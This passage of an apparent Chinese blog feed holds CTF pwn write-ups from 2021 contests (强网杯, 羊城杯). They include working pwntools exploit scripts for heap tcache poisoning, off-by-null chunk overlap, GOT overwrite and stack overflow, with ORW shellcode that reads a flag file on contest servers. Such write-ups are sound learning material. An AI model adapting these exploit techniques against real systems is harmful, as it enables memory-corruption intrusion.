\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;input index:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;input size:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;input index:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;input context:\n&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;input index:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;input index:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>leak_heap = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&#x27;leak heap: &#x27;</span>+ <span class="hljs-built_in">hex</span>(leak_heap))<br>next_heap = leak_heap + <span class="hljs-number">0xc0</span><br>tc_addr = leak_heap - <span class="hljs-number">0xf60</span><br>log.success(<span class="hljs-string">&#x27;tc addr: &#x27;</span>+ <span class="hljs-built_in">hex</span>(tc_addr))<br>free(<span class="hljs-number">3</span>)<br>edit(<span class="hljs-number">3</span>, p64(tc_addr))<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x60</span>)<br>payload = p64(<span class="hljs-number">0x200000002</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x0707070707070707</span>)*<span class="hljs-number">6</span><br>edit(<span class="hljs-number">5</span>, payload)<br><br>edit(<span class="hljs-number">1</span>, p64(next_heap))<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x50</span>)<br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x141</span>)<br>edit(<span class="hljs-number">7</span>, payload)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ebca0</span><br>log.success(<span class="hljs-string">&#x27;libc base: &#x27;</span>+ <span class="hljs-built_in">hex</span>(libc_base))<br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">53</span><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>mprotect = libc_base+libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br><br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0x50</span>) <span class="hljs-comment">#control regs</span><br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0x50</span>) <span class="hljs-comment">#control regs</span><br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0x50</span>) <span class="hljs-comment">#shellcode</span><br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>)<br>free(<span class="hljs-number">11</span>)<br>edit(<span class="hljs-number">11</span>, p64(free_hook))<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>) <span class="hljs-comment">#free_hook</span><br>edit(<span class="hljs-number">11</span>, p64(setcontext))<br>shellcode_addr = tc_addr + <span class="hljs-number">0x1110</span><br>shellcode = asm(<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rsi, 0x67616c662f2e</span><br><span class="hljs-string">    push rsi</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    mov rax, 2</span><br><span class="hljs-string">    xor rsi, rsi</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi, rax</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    mov rdx, 0x50</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>)<br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>*<span class="hljs-number">2</span><br>edit(<span class="hljs-number">8</span>, payload)<br>payload = p64(<span class="hljs-number">0</span>) + p64(tc_addr-<span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0x10000</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x7</span>) <br>payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(shellcode_addr) + p64(mprotect)<br>edit(<span class="hljs-number">9</span>, payload)<br>payload = p64(shellcode_addr + <span class="hljs-number">8</span>) + shellcode<br>edit(<span class="hljs-number">10</span>, payload)<br>free(<span class="hljs-number">8</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="easy-vm"><a href="#easy-vm" class="headerlink" title="easy_vm"></a>easy_vm</h2><p>以后学到了，再回来复现（可能是近期 吧，近期决定爆肝学习，希望能）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这次一共三题pwn，两题其实都是比较常见的堆题，可惜只做出了一题，还有一题堆上的orw在比赛前没能出 。不过总的来说：比之前还是进步了很多，</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>ptmalloc--笔记</title>
    <link href="http://example.com/2021/09/17/2021-09-17-ptmalloc-%E7%AC%94%E8%AE%B0/"/>
    <id>http://example.com/2021/09/17/2021-09-17-ptmalloc-%E7%AC%94%E8%AE%B0/</id>
    <published>2021-09-17T13:02:21.000Z</published>
    <updated>2021-10-13T08:01:24.335Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>该篇博客是学习《glibc内存管理ptmalloc源代码分析@华庭》时，边学边记录的一些零散知识点，以及可能会有的一些粗浅的个人见解，或者因某些知识产生的问题与思考</p><h2 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h2><p>1、</p><h2 id="个人问题与个人解答"><a href="#个人问题与个人解答" class="headerlink" title="个人问题与个人解答"></a>个人问题与个人解答</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;该篇博客是学习《glibc内存管理ptmalloc源代码分析@华庭》时，边学边记录的一些零散知识点，以及可能会有的一些粗浅的个人见解，或者因</summary>
      
    
    
    
    
    <category term="ptmalloc" scheme="http://example.com/tags/ptmalloc/"/>
    
  </entry>
  
  <entry>
    <title>2021强网杯PWN</title>
    <link href="http://example.com/2021/09/14/2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN/"/>
    <id>http://example.com/2021/09/14/2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN/</id>
    <published>2021-09-14T07:42:03.000Z</published>
    <updated>2021-10-13T08:01:24.335Z</updated>
    
    <content type="html"><![CDATA[<p>复现来源：</p><p><a href="https://blog.csdn.net/eeeeeight/article/details/118006138">https://blog.csdn.net/eeeeeight/article/details/118006138</a></p><p><a href="https://cloud.tencent.com/developer/article/1839670">https://cloud.tencent.com/developer/article/1839670</a></p><h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p><img src="/2021/09/14/2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN/image-20210914154341329.png" alt="image-20210914154341329"></p><p>checksec一下，64位，堆栈可执行</p><p>进入IDA，只存在申请和释放堆块的功能，其中，申请最多两次，释放只有一次。</p><p><img src="/2021/09/14/2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN/image-20210914155156145.png" alt="image-20210914155156145"></p><p><img src="/2021/09/14/2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN/image-20210914155132957.png" alt="image-20210914155132957"></p><p>首先，没有检查索引下限，所以存在数组越界，可以越界到got表。然后输入函数中，如果我们在输入size时，直接输入’\n’，将会让size直接为0，而如果size为0了，在往堆里面输入数据是就可以无限输入，因为在检验那里，buf一旦获得跟ptr一样的地址，而buf又要先自加，才就会导致一直都将大于ptr，验证一直都是没有问题的</p><p><img src="/2021/09/14/2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN/image-20210914155508246.png" alt="image-20210914155508246"></p><p>程序有沙箱，所以就是orw。加上前面发现的漏洞点，结合起来就是，通过数组越界，将堆块指针写入到函数的got表里面，然后因为无限输入，堆块又可执行，所以往堆块里面写入shellcode，最后就是调用被修改函数，转而去执行shellcode来读取flag</p><p>然后呢，本地复现不了，暂时不知道该怎么让文件去链接上题目给的seccomp文件，所以只能讲讲思路</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#sh=process(&#x27;./orw&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./orw&#x27;</span>)<br>libc=elf.libc<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>():</span><br>    shellcode=<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    xor rdi, rdi</span><br><span class="hljs-string">    xor rsi, rsi</span><br><span class="hljs-string">    xor rdx, rdx</span><br><span class="hljs-string">    mov rax, 2</span><br><span class="hljs-string">    mov rdi, 0x67616c662f2e</span><br><span class="hljs-string">    push rdi</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdx, 0x100</span><br><span class="hljs-string">    mov rsi, rdi</span><br><span class="hljs-string">    mov rdi, rax</span><br><span class="hljs-string">    mov rax, 0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>    sh.recv()<br>    sh.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">&#x27;index:&#x27;</span>)<br>    sh.sendline(<span class="hljs-string">&#x27;-25&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">&#x27;size:&#x27;</span>)<br>    sh.sendline(<span class="hljs-string">&#x27;&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">&#x27;content:&#x27;</span>)<br>    sh.sendline(asm(shellcode))<br>    sh.recv()<br>    sh.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sh.recv()<br>    sh.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sh.interactive()<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        sh=process(<span class="hljs-string">&#x27;./orw&#x27;</span>)<br>        sh=remote(<span class="hljs-string">&#x27;39.105.131.68&#x27;</span>,<span class="hljs-number">12354</span>)<br>   <span class="hljs-keyword">try</span>:<br>            pwn()<br>        <span class="hljs-keyword">except</span>:<br>            sh.close()<br></code></pre></td></tr></table></figure><h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;复现来源：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/eeeeeight/article/details/118006138&quot;&gt;https://blog.csdn.net/eeeeeight/article/details/11800613</summary>
      
    
    
    
    
    <category term="强网杯" scheme="http://example.com/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>2021羊城杯PWN</title>
    <link href="http://example.com/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/"/>
    <id>http://example.com/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/</id>
    <published>2021-09-13T08:50:56.000Z</published>
    <updated>2021-10-13T08:01:24.288Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次比赛，我能做的应该是有三题的，可能还是太菜了，比赛时就是没出，最终只做了个签到题，还好手快抢了一血，长路漫漫，继续加油吧！</p><p>复现来源：<a href="https://blog.csdn.net/eeeeeight/article/details/120255533">https://blog.csdn.net/eeeeeight/article/details/120255533</a></p><h2 id="BabyRop"><a href="#BabyRop" class="headerlink" title="BabyRop"></a>BabyRop</h2><p>这题签到题，很简单的栈溢出，没什么好讲的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br><br>p=remote(<span class="hljs-string">&#x27;192.168.39.50&#x27;</span>,<span class="hljs-number">11000</span>)<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p.recvuntil(&quot;Input:\n&quot;)</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x2c</span> + p32(<span class="hljs-number">0x80490a0</span>) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0x0804c029</span>)<br>p.sendline(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="nologin"><a href="#nologin" class="headerlink" title="nologin"></a>nologin</h2><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913165518141.png" alt="image-20210913165518141"></p><p>常规checksec，64位，保护基本没开，存在可执行段，这种一般就是注入shellcode去执行的</p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913170209042.png" alt="image-20210913170209042"></p><p>同时，当你执行到admin功能时，会开启沙箱，禁用了execve，所以这题就变成了orw了。admin功能是必须要进的，因为这里才存在着漏洞——栈溢出</p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913170334228.png" alt="image-20210913170334228"></p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913170528035.png" alt="image-20210913170528035"></p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913170611997.png" alt="image-20210913170611997"></p><p>buf这里可以写入30个字节的内容，所以可以覆盖到返回地址，但是具体的长度要动态去看。我这边是进入到了admin功能中，可以看见，前五个字节是用来对齐栈内容，接下来的八个字节就可以覆盖rbp内容，这边覆盖的是admin中输入函数的rbp</p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913171057369.png" alt="image-20210913171057369"></p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913221356910.png" alt="image-20210913221356910"></p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913221754144.png" alt="image-20210913221754144"></p><p>并且呢，.bss是属于可执行段的，先覆盖返回地址去执行read函数，因为read是有三个参数的，但是我们可以观察当执行read函数时，三个参数都是已经满足了的（因为我们刚开始就借着read函数的溢出，并且寄存器并未被改变）。所以写入数据的地方是栈上一个地址，所以先构造一次shellcode（注意shellcode大小，因为长度最多为0x1d）系统调用read函数，往.bss上写第二个shellcode，这次shellcode的长度一定要够大，不然写不下。最后就是在.bss上写最终的orw，读取flag即可</p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913211252996.png" alt="image-20210913211252996"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf = ELF(<span class="hljs-string">&quot;./nologin&quot;</span>)<br>context.binary = elf<br>p = process(<span class="hljs-string">&quot;./nologin&quot;</span>)<br>call_rsi = <span class="hljs-number">0x000000000040186b</span><br>read = elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br>gdb.attach(p,<span class="hljs-string">&quot;b *0x0000000000401007&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;input&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;&gt;password: &quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x602030</span>+<span class="hljs-number">0x28</span>)+ p64(read) + p64(call_rsi)<br>p.sendline(payload)<br>shellcode=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">              xor rax, rax;</span><br><span class="hljs-string">              push r11;</span><br><span class="hljs-string">              pop rdx;</span><br><span class="hljs-string">              mov rsi, 0x602100;</span><br><span class="hljs-string">              syscall;</span><br><span class="hljs-string">              add rsi, 28;</span><br><span class="hljs-string">              jmp rsi;</span><br><span class="hljs-string">              &#x27;&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(shellcode))<br>p.sendline(shellcode)<br>shellcode1=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">               xor rax, rax;</span><br><span class="hljs-string">               mov rax, 2;</span><br><span class="hljs-string">               sub rsi, 16;</span><br><span class="hljs-string">               mov rdi, rsi;</span><br><span class="hljs-string">               xor rsi, rsi;</span><br><span class="hljs-string">               syscall;</span><br><span class="hljs-string"></span><br><span class="hljs-string">               mov rdi, rax;</span><br><span class="hljs-string">               xor rax, rax;</span><br><span class="hljs-string">               mov rsi, 0x602300;</span><br><span class="hljs-string">               mov rdx, 0x80;</span><br><span class="hljs-string">               syscall;</span><br><span class="hljs-string">               </span><br><span class="hljs-string">               mov rax, 1;</span><br><span class="hljs-string">               mov rdi, 1;</span><br><span class="hljs-string">               syscall;</span><br><span class="hljs-string">               &#x27;&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(shellcode1))<br>p.sendline(<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">11</span> + <span class="hljs-string">&#x27;./flag\x00\x00&#x27;</span>*<span class="hljs-number">3</span> + shellcode1)<br>p.interactive() <br></code></pre></td></tr></table></figure><h2 id="Whats-your-name"><a href="#Whats-your-name" class="headerlink" title="Whats your name"></a>Whats your name</h2><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210923204918588.png" alt="image-20210923204918588"></p><p>常规checksec，64位保护全开</p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924083229104.png" alt="image-20210924083229104"></p><p>add里面，会先申请一块0x10大小的堆块，然后在前八字节作为函数指针存放puts地址，后八字节存放一个大小在0~0x100之间的堆块地址，最多能申请出10个堆块<img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924083439735.png" alt="image-20210924083439735"></p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924083201516.png" alt="image-20210924083201516"></p><p>在edit里面，写入函数会堆溢出一个0，漏洞点offbynull</p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924083514708.png" alt="image-20210924083514708"></p><p>show里面，调用之前存放的函数指针，打印堆块内容</p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924083618714.png" alt="image-20210924083618714"></p><p>释放堆块，全部置0</p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924083715443.png" alt="image-20210924083715443"></p><p>最后，程序开了沙箱，看来是要orw了</p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210923204552633.png" alt="image-20210923204552633"></p><p>这是什么都没做的情况，由于开启沙箱都是会这样的出现很多的堆块，里面有一块是unsorted chunk，给他申请回来，里面就已经存放着脏数据了，直接就能泄露libc。同样也能泄露出堆上地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0xe8</span>) <span class="hljs-comment">#0</span><br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">3951480</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>add(<span class="hljs-number">0x70</span>) <span class="hljs-comment">#1</span><br>show(<span class="hljs-number">1</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.info(<span class="hljs-string">&#x27;heap_addr==&gt;0x%x&#x27;</span> %heap_addr)<br></code></pre></td></tr></table></figure><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924092730279.png" alt="image-20210924092730279"></p><p>我们要利用offbynull，肯定是要制造出堆块重叠的，那么就一定要让堆块是连续的，所以不能是上面bin链存在的大小，并且offbynull，那溢出被覆盖为0的肯定是0xf0的堆块<img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924093026970.png" alt="image-20210924093026970"></p><p>这是连续申请出来的四个堆块，全都连在了一起，才方便我们后续制造堆块重叠</p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924093202818.png" alt="image-20210924093202818"></p><p>通过offbynull，成功将in_use位置为0</p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924094657672.png" alt="image-20210924094657672"></p><p>然后释放堆块，触发合并</p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924195657525.png" alt="image-20210924195657525"></p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924200058670.png" alt="image-20210924200058670"></p><p>然后再把0xf0堆块申请回来，接着我们申请在bin有的堆块，因为再分配就是要重叠在之前未被释放的0x40的堆块上了，而我们要和这个堆块重叠的要选择那个程序帮我们申请的堆块，因为控制这个堆块是可以借着edit功能执行任意地址写的，或者在show功能里面获得执行权限，可谓好处多多</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x38</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#5</span><br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span> + p64(<span class="hljs-number">0x140</span>))<br>free(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x20</span>) <span class="hljs-comment">#6</span><br></code></pre></td></tr></table></figure><p>到现在，所有的铺垫都已经准备好了，接着先计算一下我们需要的gadget，以及rop的地址计算，以及flag地址的排布</p><p><img 